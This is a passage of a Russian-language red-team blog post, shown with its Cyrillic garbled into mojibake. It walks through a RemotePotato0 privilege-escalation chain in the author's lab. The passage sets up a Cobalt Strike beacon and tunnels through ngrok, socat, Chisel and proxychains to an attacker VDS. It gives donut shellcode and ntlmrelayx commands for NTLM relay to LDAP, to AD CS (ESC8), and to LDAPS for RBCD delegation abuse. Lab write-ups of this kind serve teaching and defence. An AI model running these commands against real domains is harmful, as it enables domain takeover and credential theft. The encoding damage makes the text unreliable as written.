–î–ª—è –∏–º–∏—Ç–∞—Ü–∏–∏ —ç—Ç–æ–π —Å–∏—Ç—É–∞—Ü–∏–∏ —è –≤—Ä—É–±–∏–ª –æ–±—Ä–∞—Ç–Ω–æ –¥–µ—Ñ–µ–Ω–¥—ë—Ä –∏ –≤–æ—Å–ø–æ–ª—å–∑–æ–≤–∞–ª—Å—è [—Å–≤–æ–∏–º –≤–æ–ª—à–µ–±–Ω—ã–º –∏–Ω–∂–µ–∫—Ç–æ—Ä–æ–º](https://github.com/snovvcrash/DInjector) —Å –ø–æ–∑–∞–∏–º—Å—Ç–≤–æ–≤–∞–Ω–Ω–æ–π —É [@_RastaMouse](https://twitter.com/_RastaMouse) —Ç–µ—Ö–Ω–∏–∫–æ–π [Module Stomping](https://offensivedefence.co.uk/posts/module-stomping/) –∏ –ø–æ–ª—É—á–∏–ª —Å–µ—Å—Å–∏—é ¬´–∫–æ–±—ã¬ª.

[![–ù–∏—á–µ–≥–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–≥–æ](/assets/images/remote-potato-0/cs-first-beacon-trigger.png)](/assets/images/remote-potato-0/cs-first-beacon-trigger.png)
{:.center-image}

–ù–∏—á–µ–≥–æ –ø–æ–¥–æ–∑—Ä–∏—Ç–µ–ª—å–Ω–æ–≥–æ
{:.quote}

[![You've poped a shell!](/assets/images/remote-potato-0/cs-first-beacon-callback.png)](/assets/images/remote-potato-0/cs-first-beacon-callback.png)
{:.center-image}

You've poped a shell!
{:.quote}

–¢–µ–ø–µ—Ä—å –Ω–µ–º–Ω–æ–≥–æ pivoting-–∞: –æ—Ç—Å—É—Ç—Å—Ç–≤–∏–µ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–æ–π –º–∞—à–∏–Ω—ã —è –∫–æ–º–ø–µ–Ω—Å–∏—Ä—É—é —Ç–µ–º, —á—Ç–æ –ø–æ–¥–Ω–∏–º—É TCP-–∏–Ω—Å—Ç–∞–Ω—Å **ngrok**, –∫–æ—Ç–æ—Ä—ã–π –¥–∞—Å—Ç –±–µ–ª—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç –¥–ª—è –æ–±—â–µ–Ω–∏—è —Å –º–∞—à–∏–Ω–æ–π –∞—Ç–∞–∫—É—é—â–µ–≥–æ (–∫–æ—Ç–æ—Ä–∞—è –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –∑–∞ –ø—Ä–µ–¥–µ–ª–∞–º–∏ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–π —Å–µ—Ç–∏).

```
~$ ngrok tcp 136
```

[![ngrok —Å–ª—É—à–∞–µ—Ç –Ω–∞ 136/TCP](/assets/images/remote-potato-0/ngrok-tcp-136.png)](/assets/images/remote-potato-0/ngrok-tcp-136.png)
{:.center-image}

ngrok —Å–ª—É—à–∞–µ—Ç –Ω–∞ 136/TCP
{:.quote}

–¢–∞–∫ –∫–∞–∫ –º—ã –Ω–µ –º–æ–∂–µ–º –∫–æ–Ω—Ç—Ä–æ–ª–∏—Ä–æ–≤–∞—Ç—å –ø–æ—Ä—Ç, –∫–æ—Ç–æ—Ä—ã–π ngrok –≤–µ—à–∞–µ—Ç –Ω–∞ –±–µ–ª—ã–π –∞–¥—Ä–µ—Å (–∞ –Ω–∞–º –Ω—É–∂–µ–Ω —Ç–æ–ª—å–∫–æ 135/TCP), –ø–æ–Ω–∞–¥–æ–±–∏—Ç—Å—è –µ—â–µ –æ–¥–∏–Ω —Ä–µ–¥–∏—Ä–µ–∫—Ç–æ—Ä, –≤ —Ä–æ–ª–∏ –∫–æ—Ç–æ—Ä–æ–≥–æ –≤—ã—Å—Ç—É–ø–∏—Ç socat –Ω–∞ –º–æ–µ–π VDS-–∫–µ (–Ω–∞ –∞—Ç–∞–∫—É–µ–º–æ–º —Å–µ—Ä–≤–µ—Ä–µ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –¥–æ—Å—Ç—É–ø –≤ –ò–Ω—Ç–µ—Ä–Ω–µ—Ç—ã, —á—Ç–æ–±—ã –¥–æ –Ω–µ–≥–æ –¥–æ—Å—Ç—É—á–∞—Ç—å—Å—è).

```
~$ nslookup <NGROK_IP>
~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<NGROK_IP>:<NGROK_PORT>
```

[![ngrok + socat –Ω–∞ VDS](/assets/images/remote-potato-0/vds-ngrok-socat.png)](/assets/images/remote-potato-0/vds-ngrok-socat.png)
{:.center-image}

ngrok + socat –Ω–∞ VDS
{:.quote}

–¢–µ–ø–µ—Ä—å —è –º–æ–≥—É –ª–æ–≤–∏—Ç—å —Ç—Ä–∞—Ñ–∏–∫ –Ω–∞ 136/TCP –Ω–∞ –º–∞—à–∏–Ω–µ –∞—Ç—Ç–∞–∫–µ—Ä–∞, –ø—Ä–∏–ª–µ—Ç–µ–≤—à–∏–π —Å ngrok, –∏ –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª—è—Ç—å –µ–≥–æ –æ–±—Ä–∞—Ç–Ω–æ –Ω–∞ –∂–µ—Ä—Ç–≤—É. –í —ç—Ç–æ–º –º–Ω–µ –ø–æ–º–æ–∂–µ—Ç SOCKS-–ø—Ä–æ–∫—Å—è, —Ä–∞–∑–≤–µ—Ä–Ω—É—Ç–∞—è –∫–æ–±–æ–π.

–≠–º–ø–∏—Ä–∏—á–µ—Å–∫–∏–º –ø—É—Ç–µ–º –±—ã–ª–æ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–æ, —á—Ç–æ –ø—Ä–æ–∫—Å—é –ª—É—á—à–µ –ø–æ–¥–Ω–∏–º–∞—Ç—å –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –±–∏–∫–æ–Ω–µ, —Ç. –∫. –∏–∑–Ω–∞—á–∞–ª—å–Ω–∞—è —Å–µ—Å—Å–∏—è –Ω–∞—á–∏–Ω–∞–µ—Ç —Ç—É–ø–∏—Ç—å, –∫–æ–≥–¥–∞ –º—ã –¥–µ–ª–∞–µ–º `execute-assembly` —Å –Ω–∞—à–∏–º –∏–Ω–∂–µ–∫—Ç–æ—Ä–æ–º, –∫–æ—Ç–æ—Ä—ã–π –º—ã, –∫—Å—Ç–∞—Ç–∏, —Ç–∞–∫ –∏ –Ω–µ –ø—Ä–æ—Ç–µ—Å—Ç–∏–ª–∏ ‚Äì –∏—Å–ø—Ä–∞–≤–∏–º —ç—Ç–æ (—Ç–µ–ø–µ—Ä—å –Ω–∞–¥–æ —Ç–æ–ª—å–∫–æ –ø–µ—Ä–µ–≥–µ–Ω–µ—Ä–∏—Ç—å —à–µ–ª–ª–∫–æ–¥ —Å –Ω—É–∂–Ω—ã–º IP VDS-–∫–∏ –≤ –∞—Ä–≥—É–º–µ–Ω—Ç–µ `-x`).

```
beacon(1)> socks 1080
~$ sudo proxychains4 -q socat -v TCP-LISTEN:136,fork,reuseaddr TCP:<VICTIM_INTERNAL_IP>:9998
beacon(2)> execute-assembly RemotePotato0Inject.exe
```

[![–ê –≤–æ—Ç –∏ —Ö–µ—à–∏–∫–∏!](/assets/images/remote-potato-0/cs-remotepotato0-hashes.png)](/assets/images/remote-potato-0/cs-remotepotato0-hashes.png)
{:.center-image}

–ê –≤–æ—Ç –∏ —Ö–µ—à–∏–∫–∏!
{:.quote}

[![–¢–µ–º –≤—Ä–µ–º–µ–Ω–µ–º –Ω–∞ VDS](/assets/images/remote-potato-0/vds-remotepotato0-hashes.png)](/assets/images/remote-potato-0/vds-remotepotato0-hashes.png)
{:.center-image}

–¢–µ–º –≤—Ä–µ–º–µ–Ω–µ–º –Ω–∞ VDS
{:.quote}

–ù–æ –∏ —ç—Ç–æ –Ω–µ –ø—Ä–µ–¥–µ–ª –Ω–∞—à–∏—Ö –≤–æ–∑–º–æ–∂–Ω–æ—Å—Ç–µ–π ‚Äì —Ç–∞–∫–∏–º –∂–µ —Å–ø–æ—Å–æ–±–æ–º –º–æ–∂–Ω–æ –∑–∞—Ä–µ–ª–µ–∏—Ç—å –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –Ω–∞ LDAP. –î–ª—è –Ω–∞—á–∞–ª–∞ –ø–µ—Ä–µ–≥–µ–Ω–µ—Ä–∏–º —à–µ–ª–ª–∫–æ–¥ —Å –Ω—É–∂–Ω—ã–º–∏ –Ω–∞–º –∞—Ä–≥—É–º–µ–Ω—Ç–∞–º–∏ (–∏–∑–º–µ–Ω–∏–º —Ä–µ–∂–∏–º –≤ `-m` –∏ –¥–æ–±–∞–≤–∏–º –∞–¥—Ä–µ—Å VDS –≤ `-r`).

```
~$ ./donut -i RemotePotato0.exe -b=1 -t -p '-m 0 -r <VDS_IP> -x <VDS_IP> -p 9998 -s <SESSION_ID>' -o RemotePotato0.bin
```


–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –≤ –±–µ—Å–ø–ª–∞—Ç–Ω–æ–π –≤–µ—Ä—Å–∏–∏ ngrok-–∞ –Ω–µ –ø–æ–ª—É—á–∏—Ç—Å—è –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –ø–æ–¥–Ω—è—Ç—å –≤—Ç–æ—Ä–æ–π –∫–∞–Ω–∞–ª, –ø–æ—ç—Ç–æ–º—É —è –≤–æ—Å–ø–æ–ª—å–∑—É—é—Å—å [Chisel](https://github.com/jpillora/chisel) –¥–ª—è –ø–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è HTTP-—Ç—Ä–∞—Ñ–ª–∞. –û—Ç–∫—Ä–æ–≤–µ–Ω–Ω–æ –≥–æ–≤–æ—Ä—è, –º–æ–∂–Ω–æ –±—ã–ª–æ –∏ –ø–µ—Ä–≤—ã–π —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å —á–µ—Ä–µ–∑ chisel, –∏ –Ω–µ —é–∑–∞—Ç—å ngrok –≤–æ–æ–±—â–µ, –Ω–æ –ª–∞–¥–Ω–æ.

–ú—ã –ø–æ–¥—Ä–æ–±–Ω–æ —Ä–∞—Å—Å–º–∞—Ç—Ä–∏–≤–∞–ª–∏ Chisel, –∫–æ–≥–¥–∞ —Ä–µ—à–∞–ª–∏ –æ–¥–Ω—É –∏–∑ —Ç–∞—á–µ–∫ –Ω–∞ Hack The Box: https://xakep.ru/2020/02/17/htb-reddish/.

```
beacon(1)> socks 1080
(ATTACKER) ~$ ngrok tcp 136
(VDS) ~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<NGROK_IP>:<NGROK_PORT>
(VDS) ~$ sudo ./chisel server -p 8000 --reverse --auth <USER>:<PASS>
(ATTACKER) ~$ ./chisel client --auth <USER>:<PASS> <VDS_IP>:8000 R:80:127.0.0.1:8080
(ATTACKER) ~$ sudo proxychains4 -q socat -v TCP-LISTEN:136,fork,reuseaddr TCP:<VICTIM_INTERNAL_IP>:9998
(ATTACKER) ~$ sudo proxychains4 -q ntlmrelayx.py -t ldap://<DC_INTERNAL_IP> --http-port 8080 --no-smb-server --no-wcf-server --no-raw-server --escalate-user <PWNED_USER>
beacon(2)> execute-assembly RemotePotato0Inject.exe
```

[![–†–µ–ª–µ–∏–º HTTP —á–µ—Ä–µ–∑ Chisel](/assets/images/remote-potato-0/cs-remotepotato0-relay.png)](/assets/images/remote-potato-0/cs-remotepotato0-relay.png)
{:.center-image}

–†–µ–ª–µ–∏–º HTTP —á–µ—Ä–µ–∑ Chisel
{:.quote}

[![–¢–µ–º –≤—Ä–µ–º–µ–Ω–µ–º –Ω–∞ VDS (–¥—É–±–ª—å 2)](/assets/images/remote-potato-0/vds-remotepotato0-relay.png)](/assets/images/remote-potato-0/vds-remotepotato0-relay.png)
{:.center-image}

–¢–µ–º –≤—Ä–µ–º–µ–Ω–µ–º –Ω–∞ VDS (–¥—É–±–ª—å 2)
{:.quote}

–ò —è —Å–Ω–æ–≤–∞ —ç–Ω—Ç–µ—Ä–ø—Ä–∞–π–∑ –∞–¥–º–∏–Ω. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –º—ã —Å–∫—Ä–∞—Ñ—Ç–∏–ª–∏ —Å–ø–æ—Å–æ–± –ø–æ–≤—ã—à–µ–Ω–∏—è –ø—Ä–∏–≤–∏–ª–µ–≥–∏–π —Å –ø–æ–º–æ—â—å—é RemotePotato0 –±–µ–∑ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–æ–≥–æ —Ö–æ—Å—Ç–∞ –Ω–∞ –≤–Ω—É—Ç—Ä–µ–Ω–Ω–µ–º –ø–µ—Ä–∏–º–µ—Ç—Ä–µ!

# –ë–æ–Ω—É—Å ‚Ññ 1. –†–µ–ª–µ–π –Ω–∞ AD CS (ESC8)

–í —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ –ø–æ –∫–∞–∫–æ–π-–ª–∏–±–æ –ø—Ä–∏—á–∏–Ω–µ —Ä–µ–ª–µ–∏—Ç—å –Ω–∞ LDAP(S) –Ω–µ –ø–æ–ª—É—á–∞–µ—Ç—Å—è, –Ω–æ –≤ –¥–æ–º–µ–Ω–µ –µ—Å—Ç—å –Ω–µ–∑–∞—â–∏—â–µ–Ω–Ω—ã–π —ç–Ω–¥–ø–æ–∏–Ω—Ç Web Enrollment —Ü–µ–Ω—Ç—Ä–∞ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ AD CS, –º–æ–∂–Ω–æ –ø—Ä–æ–≤–µ—Ä–Ω—É—Ç—å –≤–∞—Ä–∏–∞—Ü–∏—é –∞—Ç–∞–∫–∏ ESC8 (—Å–º–æ—Ç—Ä–∏–º —Ä–µ—Å–µ—Ä—á [Certified Pre-Owned](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf) –∑–∞ –ø–æ–¥—Ä–æ–±–Ω–æ—Å—Ç—è–º–∏).

–î–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã —Ä–µ–ª–µ–π —Å—Ä–∞–±–æ—Ç–∞–ª –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ, –º–æ–∂–µ—Ç –ø–æ—Ç—Ä–µ–±–æ–≤–∞—Ç—å—Å—è –ø–æ–∏–≥—Ä–∞—Ç—å —Å —Ä–∞–∑–Ω—ã–º–∏ –∑–Ω–∞—á–µ–Ω–∏—è–º–∏ CLSID, –∫–æ—Ç–æ—Ä—ã–µ –º–æ–∂–Ω–æ —É–∫–∞–∑–∞—Ç—å —á–µ—Ä–µ–∑ –∞—Ä–≥—É–º–µ–Ω—Ç `-c`. –ó–∞—Ö–∞—Ä–¥–∫–æ–∂–µ–Ω–Ω–æ–µ –∑–Ω–∞—á–µ–Ω–∏–µ `{5167B42F-C111-47A1-ACC4-8EABE61B0B54}` –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç –∏–∑-–∑–∞ —Ç–æ–≥–æ, —á—Ç–æ —Ä–∞–∑–Ω—ã–µ —Å–ª—É–∂–±—ã (—Å —Ä–∞–∑–Ω—ã–º–∏ CLSID) –∏—Å–ø–æ–ª—å–∑—É—é—Ç —Ä–∞–∑–Ω—ã–µ [—É—Ä–æ–≤–Ω–∏ –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-raiw/a83205a2-23e2-41bb-84e1-4d968aaae4e8#gt_bfb9708e-9d05-4f79-8969-ef63f73aa434) –ø—Ä–∏ –∏—Ö —Ç—Ä–∏–≥–≥–µ—Ä–µ –ø–æ RPC (–æ–ø—Ä–µ–¥–µ–ª—è–µ—Ç—Å—è –∑–Ω–∞—á–µ–Ω–∏–µ–º [—ç—Ç–∏—Ö –∫–æ–Ω—Å—Ç–∞–Ω—Ç](https://docs.microsoft.com/en-us/windows/win32/rpc/authentication-service-constants)). –¢–æ, —á—Ç–æ —Ä–∞–±–æ—Ç–∞–µ—Ç –ø—Ä–∏ —Ä–µ–ª–µ–µ –Ω–∞ LDAP, –º–æ–∂–µ—Ç –Ω–µ —Å—Ä–∞–±–æ—Ç–∞—Ç—å –ø—Ä–∏ —Ä–µ–ª–µ–µ –Ω–∞ SMB / HTTP (–≤ —Å–ª—É—á–∞–µ ESC8 —Ä–µ–ª–µ–∏–º –∏–º–µ–Ω–Ω–æ –Ω–∞ HTTP).

–¢–∞–∫ –≤–æ—Ç, –æ–ø—è—Ç—å –∂–µ –∏–º–ø–µ—Ä–∏—á–µ—Å–∫–∏–º –ø—É—Ç–µ–º –≤—ã—è—Å–Ω–µ–Ω–æ, —á—Ç–æ –¥–ª—è ESC8 –ø–æ–¥—Ö–æ–¥–∏—Ç —Å–ª—É–∂–±–∞ **CastServerInteractiveUser** —Å–æ –∑–Ω–∞—á–µ–Ω–∏–µ–º CLSID `{f8842f8e-dafe-4b37-9d38-4e0714a61149}`.

–ü—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞—Ç—å —Å–æ —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–º, –∫ —Å–æ–∂–∞–ª–µ–Ω–∏—é, –Ω–µ –ø–æ–ª—É—á–∏—Ç—Å—è, —Ç. –∫. –≤ –º–æ–µ–π –ª–∞–±–∞ —Å–µ—Ä–≤–µ—Ä TEXAS –∏ –≤—ã–ø–æ–ª–Ω—è–µ—Ç —Ä–æ–ª—å AD CS, –∞ reflective-—Ä–µ–ª–µ–π —Å —Å–∞–º–æ–≥–æ —Å–µ–±–µ –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–µ—Ç.

[![–í–æ—Ç –≤–∞–º –ø—Ä—É—Ñ](/assets/images/remote-potato-0/adcs-server.png)](/assets/images/remote-potato-0/adcs-server.png)
{:.center-image}

–í–æ—Ç –≤–∞–º –ø—Ä—É—Ñ
{:.quote}

–ù–æ –≤ –∫–æ–º–∞–Ω–¥–∞—Ö —ç—Ç–æ –¥–æ–ª–∂–Ω–æ –±—ã–ª–æ –±—ã –≤—ã–≥–ª—è–¥–µ—Ç—å –ø—Ä–∏–º–µ—Ä–Ω–æ —Ç–∞–∫.

```
~$ ./donut -i RemotePotato0.exe -b=1 -t -p '-m 0 -r <ATTACKER_IP> -x <ATTACKER_IP> -p 9998 -s <SESSION_ID> -c {f8842f8e-dafe-4b37-9d38-4e0714a61149}' -o RemotePotato0.bin
~$ ntlmrelayx.py -t http://<ADCS_CA_IP>/certsrv/certfnsh.asp --no-smb-server --no-wcf-server --no-raw-server --adcs --template User
```

–ü—Ä–∏ —É—Å–ø–µ—à–Ω–æ–π –≥–µ–Ω–µ—Ä–∞—Ü–∏–∏ —Å–µ—Ä—Ç–∏—Ñ–∏–∫–∞—Ç–∞ –æ—Ç –∏–º–µ–Ω–∏ –∞—Ç–∞–∫–æ–≤–∞–Ω–Ω–æ–≥–æ –ø–æ–ª—å–∑—é–∫–∞, –¥–∞–ª–µ–µ –¥–µ–π—Å—Ç–≤—É–µ–º –æ–±—ã—á–Ω–æ, –∫–∞–∫ —ç—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–æ—Å–ª–µ –ø—Ä–æ–≤–µ–¥–µ–Ω–∏–µ ESC8-–∞—Ç–∞–∫–∏, –∞ –∏–º–µ–Ω–Ω–æ –ø–æ–ª—å–∑—É–µ–º—Å—è ¬´[–†—É–±–µ–≤—É—Å–æ–º](https://github.com/GhostPack/Rubeus#asktgt)¬ª (—Ñ–ª–∞–≥ `/getcredentials`) –∏–ª–∏ [PKINITtools](https://github.com/dirkjanm/PKINITtools) –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è TGT –∏/–∏–ª–∏ NT-—Ö–µ—à–∞ –∂–µ—Ä—Ç–≤—ã.

# –ë–æ–Ω—É—Å ‚Ññ 2. Remote Potato –±–µ–∑ RemotePotato0.exe

–í —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–∏ Impacket –∂–¥–µ—Ç —Å–≤–æ–µ–≥–æ —á–∞—Å–∞ [pull request](https://github.com/SecureAuthCorp/impacket/pull/1299), –∏–∑–±–∞–≤–ª—è—é—â–∏–π –Ω–∞—Å –æ—Ç –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ—Å—Ç–∏ —Ç–∞—â–∏—Ç—å –Ω–∞ –∞—Ç–∞–∫—É–µ–º—ã–π —Ö–æ—Å—Ç RemotePotato0.exe: —Ç—Ä–∏–≥–≥–µ—Ä NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏ –ø–µ—Ä–µ–Ω–µ—Å–ª–∏ [–≤ —ç—Ç–æ—Ç —Ñ–æ—Ä–∫ SweetPotato](https://github.com/MrAle98/SweetPotato), RPC-—Å–µ—Ä–≤–µ—Ä —Ä–µ–∞–ª–∏–∑–æ–≤–∞–ª–∏ –≤ —Å–∞–º–æ–º ntlmrelayx.py, –∞ OXID-—Ä–µ–∑–æ–ª–≤–µ—Ä –≤—ã–Ω–µ—Å–ª–∏ –≤ –æ—Ç–¥–µ–ª—å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç rpcoxidresolver.py. –û–¥–Ω–∞–∫–æ –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ —Å–∞–º—ã–π –≤–∫—É—Å–Ω—ã–π —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª –±—É–¥–µ—Ç —É—Ä–µ–∑–∞–Ω ‚Äì —Ç—Ä–∏–≥–≥–µ—Ä–∏—Ç—å NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –º–æ–∂–Ω–æ —Ç–æ–ª—å–∫–æ –æ—Ç –∏–º–µ–Ω–∏ –º–∞—à–∏–Ω–Ω–æ–π –£–ó, –Ω–æ –Ω–µ —Å–∫–≤–æ–∑—å —á—É–∂—É—é —Å–µ—Å—Å–∏—é.

–Ø –ø–æ–∫–∞–∂—É —Å–ø–æ—Å–æ–± –≤–æ–æ—Ä—É–∂–∏—Ç—å –∏ —ç—Ç–æ—Ç –≤–∞—Ä–∏–∞–Ω—Ç –∞—Ç–∞–∫–∏, –∏–º–µ—è –ø–æ–¥ —Ä—É–∫–æ–π —Ç–æ–ª—å–∫–æ –±–∏–∫–æ–Ω ¬´–∫–æ–±—ã¬ª –∏ –∏–Ω—Å—Ç–∞–Ω—Å VDS, —á–µ—Ä–µ–∑ –∫–ª–∞—Å—Å–∏—á–µ—Å–∫—É—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é **RBCD-–∞–±—å—é–∑–∞** –¥–ª—è –ø—ã–≤–Ω–∞ —Å–µ—Ä–≤–µ—Ä–∞, –æ—Ç–∫—É–¥–∞ –ø—Ä–∏–ª–µ—Ç–∞–µ—Ç –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è.

–î–ª—è —ç—Ç–æ–≥–æ —Å–Ω–∞—á–∞–ª–∞ –æ–ø—Ä–µ–¥–µ–ª–∏–º—Å—è, —á—Ç–æ, –∫—É–¥–∞ –∏ –∑–∞—á–µ–º –º—ã —Ä–µ–¥–∏—Ä–µ–∫—Ç–∏–º:

1. –° –ø–æ–º–æ—â—å—é ngrok —Å–æ–∑–¥–∞–µ–º TCP-–∫–∞–Ω–∞–ª –∏–∑–≤–Ω–µ –¥–æ **localhost:135**. –¢–∞–∫ –∫–∞–∫ RPC-—Å–µ—Ä–≤–µ—Ä —Ç–µ–ø–µ—Ä—å –∫—Ä—É—Ç–∏—Ç—Å—è –Ω–∞ –º–∞—à–∏–Ω–µ –∞—Ç–∞–∫—É—é—â–µ–≥–æ, –Ω–∞–º –Ω–µ –Ω—É–∂–Ω–æ –Ω–∏—á–µ–≥–æ –∑–µ—Ä–∫–∞–ª–∏—Ç—å –≤—Ç–æ—Ä—ã–º socat ‚Äì –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –∑–∞–ø—É—Å—Ç–∏—Ç—å rpcoxidresolver.py, –∫–æ—Ç–æ—Ä—ã–π —É–∂–µ [—Å–ª—É—à–∞–µ—Ç localhost:135](https://github.com/SecureAuthCorp/impacket/blob/9ac5e9efdf0dca58e56f62e6bd15d64ce772d2ca/examples/rpcoxidresolver.py#L131).
2. –° –ø–æ–º–æ—â—å—é Chisel –ø—Ä–æ–±—Ä–∞—Å—ã–≤–∞–µ–º –ø–æ—Ä—Ç 9997 —Å VDS –Ω–∞ –ø–æ—Ä—Ç 9998 –º–∞—à–∏–Ω—ã –∞—Ç–∞–∫—É—é—â–µ–≥–æ, –∫–æ—Ç–æ—Ä—ã–π —Å–ª—É—à–∞–µ—Ç RPC-—Å–µ—Ä–≤–µ—Ä ntlmrelayx.py. –í –∫–∞—á–µ—Å—Ç–≤–µ –∞–¥—Ä–µ—Å–∞ RPC-—Å–µ—Ä–≤–µ—Ä–∞ –≤ rpcoxidresolver.py (–æ–ø—Ü–∏—è `-rip`) —É–∫–∞–∑—ã–≤–∞–µ–º IP –Ω–∞—à–µ–≥–æ VDS ‚Äì —ç—Ç–æ –Ω—É–∂–Ω–æ –¥–ª—è —Ç–æ–≥–æ, —á—Ç–æ–±—ã –ø–µ—Ä–µ–¥–∞—Ç—å NTLM-–∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—é –≤ ntlmrelayx.py (–ø—Ä–∏ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–∏ –∞–¥—Ä–µ—Å–∞ 127.0.0.1 —ç—Ç–∞ –∫–æ–Ω—Å—Ç—Ä—É–∫—Ü–∏—è —Ä–∞–±–æ—Ç–∞—Ç—å –æ—Ç–∫–∞–∑—ã–≤–∞–µ—Ç—Å—è).
3. ntlmrelayx.py –ø—É—Å–∫–∞–µ–º —á–µ—Ä–µ–∑ –ø—Ä–æ–∫—Å—é CS –¥–ª—è —Ä–µ–ª–µ—è –Ω–∞ —Å–ª—É–∂–±—É LDAPS –∫–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä–∞ –¥–æ–º–µ–Ω–∞. –î–∞, –Ω–∞ LDAP**S**, –ø–æ—Ç–æ–º—É —á—Ç–æ –≤ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–µ —Ä–µ–ª–µ—è –º—ã —Ö–æ—Ç–∏–º –Ω–∞—Å—Ç—Ä–æ–∏—Ç—å –¥–µ–ª–µ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ –æ—Ç–Ω–æ—Å–∏—Ç–µ–ª—å–Ω–æ –≤—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–æ–π —Å–µ—Ä–≤–∏—Å–Ω–æ–π –£–ó, –∫–æ—Ç–æ—Ä—É—é –Ω–µ–ª—å–∑—è —Å–æ–∑–¥–∞—Ç—å –ø–æ LDAP.
4. –°—Ç—Ä–µ–ª—è–µ–º SweetPotato.exe –∏–∑ CS —Å —Ç—Ä–∏–≥–≥–µ—Ä–æ–º CLSID `{42CBFAA7-A4A7-47BB-B422-BD10E9D02700}`, –ø—Ä–µ–¥–ª–∞–≥–∞–µ–º–æ–≥–æ –∞–≤—Ç–æ—Ä–æ–º PR.

```
beacon(1)> socks 1080
(ATTACKER) ~$ ngrok tcp 135
(VDS) ~$ sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:<NGROK_IP>:<NGROK_PORT>
(VDS) ~$ sudo ./chisel server -p 6666 --reverse --auth <USER>:<PASS>
(ATTACKER) ~$ ./chisel client --auth <USER>:<PASS> <VDS_IP>:6666 R:9997:127.0.0.1:9998
(ATTACKER) ~$ python examples/rpcoxidresolver.py -oip 127.0.0.1 -rip <VDS_IP> -rport 9997
(ATTACKER) ~$ proxychains4 -q python examples/ntlmrelayx.py -t ldaps://<INTERNAL_DC_IP> --rpc-port 9998 -smb2support --no-smb-server --no-http-server --no-wcf-server --no-raw-server --no-da --no-acl --delegate-access
beacon(2)> execute-assembly SweetPotato.exe -e 1 -oip <VDS_IP> -c 42CBFAA7-A4A7-47BB-B422-BD10E9D02700
```

[![S4U2Proxy, —è –∏–¥—É!](/assets/images/remote-potato-0/cs-sweetpotato-relay.png)](/assets/images/remote-potato-0/cs-sweetpotato-relay.png)
{:.center-image}

S4U2Proxy, —è –∏–¥—É!
{:.quote}

–ü–æ—Å–ª–µ —ç—Ç–æ–≥–æ, –ø–æ–ª–∞–≥–∞—é, –Ω–µ –Ω—É–∂–Ω–æ –æ–±—ä—è—Å–Ω—è—Ç—å, —á—Ç–æ –¥–µ–ª–∞—Ç—å –¥–∞–ª—å—à–µ.

–ü–æ–ª—É—á–∞–µ–º TGS-–±–∏–ª–µ—Ç —á–µ—Ä–µ–∑ —Ç—Ä–∞–Ω–∑–∏—Ç–Ω—ã–µ —Ä–∞—Å—à–∏—Ä–µ–Ω–∏—è Kerberos (S4U2Self & S4U2Proxy) —Å –æ–ø—Ü–∏–µ–π –æ–ª–∏—Ü–µ—Ç–≤–æ—Ä–µ–Ω–∏—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è administrator ([getST.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getST.py)) –∏ —Ñ–∏–≥–∞—á–∏–º [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) / [wmiexec.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py), —á—Ç–æ–±—ã –∏–∑–≤–ª–µ—á—å —Å–µ–∫—Ä–µ—Ç—ã LSA –∏–ª–∏ 